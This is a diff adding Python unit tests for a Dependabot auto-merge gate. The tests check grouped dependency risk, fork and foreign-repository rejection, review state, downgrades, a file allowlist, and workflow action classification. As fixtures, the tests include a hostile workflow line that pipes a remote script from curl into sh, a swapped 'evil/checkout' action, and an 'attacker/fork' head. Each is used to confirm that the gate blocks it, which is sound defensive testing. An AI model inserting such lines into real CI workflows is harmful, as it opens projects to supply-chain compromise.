@@ -19,8 +19,20 @@ SHA = "a" * 40
 SHA2 = "b" * 40
 
 
+REPO = "uesu/News-Express"
+
+
 def _pr(*, login="dependabot[bot]", sha=SHA, ref="dependabot/pip/foo", draft=False,
-        labels=None, mergeable=True, mergeable_state="clean", base="main"):
+        labels=None, mergeable=True, mergeable_state="clean", base="main",
+        head_repo=REPO, base_repo=REPO):
+    # Real GitHub PR payloads always carry head.repo and base.repo. Omitting them
+    # let every fixture skip the same-repository association check entirely.
+    head = {"sha": sha, "ref": ref}
+    if head_repo is not None:
+        head["repo"] = {"full_name": head_repo, "default_branch": "main"}
+    base_obj = {"ref": base}
+    if base_repo is not None:
+        base_obj["repo"] = {"full_name": base_repo, "default_branch": "main"}
     return {
         "number": 12,
         "state": "open",
@@ -29,8 +41,8 @@ def _pr(*, login="dependabot[bot]", sha=SHA, ref="dependabot/pip/foo", draft=Fal
         "mergeable": mergeable,
         "mergeable_state": mergeable_state,
         "user": {"login": login},
-        "head": {"sha": sha, "ref": ref},
-        "base": {"ref": base},
+        "head": head,
+        "base": base_obj,
         "labels": labels or [],
     }
 
@@ -64,6 +76,13 @@ def _snapshot(**overrides):
                 },
             },
             "allowed_merge_method": "squash",
+            "dependabot_allowed_files": [
+                "requirements.in",
+                "requirements.txt",
+                "requirements-dev.in",
+                "requirements-dev.txt",
+                ".github/workflows/",
+            ],
         },
     }
     data.update(overrides)
@@ -330,6 +349,215 @@ class CiRegistryTests(unittest.TestCase):
         import ci as ci_mod
         self.assertEqual(ci_mod.final_gate({"application": 0, "maintenance": 1}), 1)
         self.assertEqual(ci_mod.final_gate({"application": 0, "maintenance": 0}), 0)
+
+
+class GroupedUpdateRiskTests(unittest.TestCase):
+    """Every package in a grouped diff must be classified, not just the last."""
+
+    MAJOR_THEN_PATCH = (
+        "-aiohttp==3.14.5 \\\n+aiohttp==4.0.0 \\\n"
+        "     --hash=sha256:aa\n"
+        "-idna==3.19 \\\n+idna==3.20 \\\n"
+    )
+    PATCH_THEN_MAJOR = (
+        "-idna==3.19 \\\n+idna==3.20 \\\n"
+        "-aiohttp==3.14.5 \\\n+aiohttp==4.0.0 \\\n"
+    )
+
+    def _risk(self, patch):
+        return maintenance.snapshot_risk_from_files(
+            [{"filename": "requirements.txt", "patch": patch}], None
+        )
+
+    def test_grouped_major_is_not_hidden_by_a_later_patch(self):
+        # Regression: the parser kept only the final old/new pair per file, so the
+        # aiohttp major was overwritten by the idna patch and the PR read routine.
+        for label, patch in (("major-first", self.MAJOR_THEN_PATCH),
+                             ("patch-first", self.PATCH_THEN_MAJOR)):
+            with self.subTest(order=label):
+                risk = self._risk(patch)
+                self.assertEqual(risk["risk"], "review-required")
+                self.assertFalse(risk["auto_eligible"])
+                self.assertEqual(risk["members"], 2)
+                self.assertEqual(risk["name"], "aiohttp")
+
+    def test_every_package_is_counted(self):
+        patch = ("-a==1.0.0\n+a==1.0.1\n-b==2.0.0\n+b==2.0.1\n-c==3.0.0\n+c==3.0.1\n")
+        self.assertEqual(self._risk(patch)["members"], 3)
+
+    def test_added_and_removed_packages_require_review(self):
+        for label, patch, reason in (
+            ("added", "+six==1.0.0 \\", "package-added"),
+            ("removed", "-six==1.0.0 \\", "package-removed"),
+        ):
+            with self.subTest(case=label):
+                risk = self._risk(patch)
+                self.assertEqual(risk["risk"], "review-required")
+                self.assertFalse(risk["auto_eligible"])
+                self.assertEqual(risk["reason"], reason)
+
+    def test_unparseable_patch_requires_review(self):
+        risk = self._risk("     --hash=sha256:deadbeef\n")
+        self.assertEqual(risk["risk"], "review-required")
+        self.assertEqual(risk["reason"], "requirements-patch-unparsed")
+
+    def test_a_plain_patch_update_stays_routine(self):
+        risk = self._risk("-aiohttp==3.14.5 \\\n+aiohttp==3.14.6 \\\n")
+        self.assertEqual(risk["risk"], "routine")
+        self.assertTrue(risk["auto_eligible"])
+
+
+class RepositoryAssociationTests(unittest.TestCase):
+    """Branch and base ref alone are not provenance."""
+
+    def test_fork_head_is_rejected(self):
+        snap = _snapshot(pull_request=_pr(head_repo="attacker/fork"))
+        decision = maintenance.decide_merge(snap)
+        self.assertEqual(decision.action, "fail")
+        self.assertEqual(decision.reason, "cross-fork-head")
+
+    def test_foreign_base_repository_is_rejected(self):
+        snap = _snapshot(pull_request=_pr(base_repo="other/repo"))
+        decision = maintenance.decide_merge(snap)
+        self.assertEqual(decision.action, "fail")
+        self.assertEqual(decision.reason, "foreign-base-repository")
+
+    def test_missing_association_fails_closed(self):
+        for label, kwargs in (("head", {"head_repo": None}), ("base", {"base_repo": None})):
+            with self.subTest(missing=label):
+                decision = maintenance.decide_merge(_snapshot(pull_request=_pr(**kwargs)))
+                self.assertEqual(decision.action, "fail")
+                self.assertEqual(decision.reason, "missing-repo-association")
+
+    def test_same_repository_still_merges(self):
+        self.assertEqual(maintenance.decide_merge(_snapshot()).action, "merge")
+
+
+def _review(login, state, when, rid):
+    return {"user": {"login": login}, "state": state, "submitted_at": when, "id": rid}
+
+
+class EffectiveReviewTests(unittest.TestCase):
+    """Latest decision per reviewer, not any historical change request."""
+
+    PR = {"state": "open", "draft": False, "labels": []}
+
+    def test_later_approval_clears_an_old_change_request(self):
+        reviews = [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1),
+                   _review("a", "APPROVED", "2026-02-01T00:00:00Z", 2)]
+        self.assertIsNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))
+
+    def test_a_still_current_change_request_blocks(self):
+        for label, reviews in (
+            ("only", [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1)]),
+            ("approval came first", [_review("a", "APPROVED", "2026-01-01T00:00:00Z", 1),
+                                     _review("a", "CHANGES_REQUESTED", "2026-02-01T00:00:00Z", 2)]),
+            ("another reviewer", [_review("a", "APPROVED", "2026-02-01T00:00:00Z", 2),
+                                  _review("b", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1)]),
+        ):
+            with self.subTest(case=label):
+                self.assertIsNotNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))
+
+    def test_dismissal_clears_the_request(self):
+        reviews = [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1),
+                   _review("a", "DISMISSED", "2026-02-01T00:00:00Z", 2)]
+        self.assertIsNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))
+
+    def test_equal_timestamps_resolve_by_id(self):
+        reviews = [_review("a", "APPROVED", "2026-01-01T00:00:00Z", 1),
+                   _review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 2)]
+        self.assertIsNotNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))
+
+
+class DowngradeTests(unittest.TestCase):
+    """A step backwards is not a patch."""
+
+    def test_forced_python_downgrade_is_not_auto_eligible(self):
+        # Regression: 3.14.8 -> 3.14.7 classified as "patch" and came back
+        # proposed / auto_eligible True with an empty manifest.
+        result = maintenance.select_python_candidate(
+            maintenance.parse_version("3.14.8"), {}, force="3.14.7"
+        )
+        self.assertEqual(result["status"], "review-required")
+        self.assertEqual(result["reason"], "override-downgrade")
+        self.assertFalse(result["auto_eligible"])
+
+    def test_forced_patch_upgrade_still_proposes(self):
+        result = maintenance.select_python_candidate(
+            maintenance.parse_version("3.14.8"), {}, force="3.14.9"
+        )
+        self.assertEqual(result["status"], "proposed")
+        self.assertTrue(result["auto_eligible"])
+
+    def test_package_downgrade_requires_review(self):
+        for old, new in (("3.19", "3.18"), ("3.14.6", "3.14.5"), ("2.0.0", "1.9.9")):
+            with self.subTest(change=f"{old}->{new}"):
+                result = maintenance.classify_package_update(old, new, name="idna")
+                self.assertEqual(result["risk"], "review-required")
+                self.assertFalse(result["auto_eligible"])
+
+    def test_package_upgrade_is_unaffected(self):
+        self.assertEqual(
+            maintenance.classify_package_update("3.19", "3.20", name="idna")["risk"], "routine"
+        )
+
+
+class TrustedAllowlistTests(unittest.TestCase):
+    """The allowlist must come from policy, never from the diff itself."""
+
+    def test_absent_allowlist_requires_review(self):
+        snap = _snapshot()
+        snap["policy"].pop("dependabot_allowed_files", None)
+        snap.pop("trusted_allowed_files", None)
+        snap["allowed_files"] = []
+        decision = maintenance.decide_merge(snap)
+        self.assertEqual(decision.action, "review-required")
+        self.assertEqual(decision.reason, "no-trusted-allowlist")
+
+    def test_path_outside_the_allowlist_is_rejected(self):
+        snap = _snapshot(files=[{"filename": ".github/scripts/maintenance.py", "patch": "+x = 1\n"}])
+        decision = maintenance.decide_merge(snap)
+        self.assertNotEqual(decision.action, "merge")
+
+    def test_workflow_directory_prefix_is_allowed_by_policy(self):
+        self.assertTrue(maintenance._path_allowed(".github/workflows/ci.yml", {".github/workflows/"}))
+        self.assertFalse(maintenance._path_allowed(".github/secret.yml", {".github/workflows/"}))
+
+
+class WorkflowActionClassificationTests(unittest.TestCase):
+    """A workflow filename is not proof that only a safe pin line changed."""
+
+    FILE = ".github/workflows/ci.yml"
+
+    def _risk(self, patch):
+        return maintenance.snapshot_risk_from_files([{"filename": self.FILE, "patch": patch}], None)
+
+    def test_same_source_pin_bump_is_routine(self):
+        patch = f"-uses: actions/checkout@{SHA}  # v7\n+uses: actions/checkout@{SHA2}  # v7\n"
+        risk = self._risk(patch)
+        self.assertEqual(risk["risk"], "routine")
+        self.assertTrue(risk["auto_eligible"])
+
+    def test_every_unsafe_action_transition_requires_review(self):
+        cases = {
+            "major bump": f"-uses: actions/checkout@{SHA}  # v7\n+uses: actions/checkout@{SHA2}  # v8\n",
+            "source change": f"-uses: actions/checkout@{SHA}  # v7\n+uses: evil/checkout@{SHA2}  # v7\n",
+            "floating ref": f"-uses: actions/checkout@{SHA}  # v7\n+uses: actions/checkout@v8\n",
+            "action removed": f"-uses: actions/checkout@{SHA}  # v7\n",
+            "action added": f"+uses: actions/checkout@{SHA}  # v7\n",
+            "no uses line at all": "-        run: echo hi\n+        run: curl http://x | sh\n",
+        }
+        for label, patch in cases.items():
+            with self.subTest(case=label):
+                risk = self._risk(patch)
+                self.assertEqual(risk["risk"], "review-required", label)
+                self.assertFalse(risk["auto_eligible"], label)
+
+    def test_a_command_change_without_policy_keywords_is_not_routine(self):
+        # Regression: this used to read as a routine "action-pin" purely because
+        # the diff contained no on:/permissions: lines.
+        risk = self._risk("-        run: pip install foo\n+        run: pip install foo --upgrade\n")
+        self.assertEqual(risk["reason"], "workflow-non-pin-change")
 
 
 class LiveAdapterEvidenceTests(unittest.TestCase):
